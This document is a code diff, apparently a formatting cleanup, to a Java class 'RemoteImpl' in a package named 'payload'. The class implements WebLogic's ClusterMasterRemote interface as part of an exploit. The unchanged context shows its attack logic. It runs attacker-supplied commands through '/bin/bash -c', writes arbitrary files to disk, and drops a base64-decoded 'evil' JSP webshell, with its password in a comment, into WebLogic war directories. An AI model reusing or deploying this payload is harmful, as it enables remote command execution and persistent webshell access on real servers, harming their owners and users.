@@ -1,6 +1,5 @@
 package com.supeream.payload;
 
-import sun.tools.asm.TryData;
 import weblogic.cluster.singleton.ClusterMasterRemote;
 import weblogic.utils.encoders.BASE64Decoder;
 
@@ -12,7 +11,6 @@ import java.io.FileOutputStream;
 import java.io.InputStreamReader;
 import java.rmi.RemoteException;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 
 /**
@@ -41,19 +39,13 @@ public class RemoteImpl implements ClusterMasterRemote {
         }
     }
 
-
-    @Override
-    public void setServerLocation(String cmd, String args) throws RemoteException {
-
-    }
-
     public static void uploadFile(String path, byte[] content) {
         try {
             FileOutputStream fileOutputStream = new FileOutputStream(path);
             fileOutputStream.write(content);
             fileOutputStream.flush();
             fileOutputStream.close();
-        }catch (Exception e) {
+        } catch (Exception e) {
 
         }
     }
@@ -65,8 +57,8 @@ public class RemoteImpl implements ClusterMasterRemote {
             File file = new File(dir);
             if (file.exists()) {
                 String[] names = file.list();
-                for (String name:names) {
-                    String path = dir+name+"/war/"+fileName+".jsp";
+                for (String name : names) {
+                    String path = dir + name + "/war/" + fileName + ".jsp";
                     FileOutputStream fileOutputStream = new FileOutputStream(path);
                     //passwd qishiwoshiyigehaoren
                     fileOutputStream.write(new BASE64Decoder().decodeBuffer(evil));
@@ -75,11 +67,15 @@ public class RemoteImpl implements ClusterMasterRemote {
                 }
             }
 
-        }catch (Exception e) {
+        } catch (Exception e) {
 
         }
     }
 
+    @Override
+    public void setServerLocation(String cmd, String args) throws RemoteException {
+
+    }
 
     @Override
     public String getServerLocation(String cmd) throws RemoteException {
@@ -101,7 +97,7 @@ public class RemoteImpl implements ClusterMasterRemote {
 
             if (cmd.startsWith("$NO$")) {
                 cmds.add(cmd.substring(4));
-            }else if (isLinux) {
+            } else if (isLinux) {
                 cmds.add("/bin/bash");
                 cmds.add("-c");
                 cmds.add(cmd);
